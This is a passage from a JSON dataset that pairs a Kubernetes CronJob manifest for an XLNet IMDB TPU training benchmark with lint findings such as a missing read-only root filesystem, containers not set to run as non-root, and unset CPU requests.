--d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "8032",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "8033",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "8034",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "8035",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "8036",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "8037",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                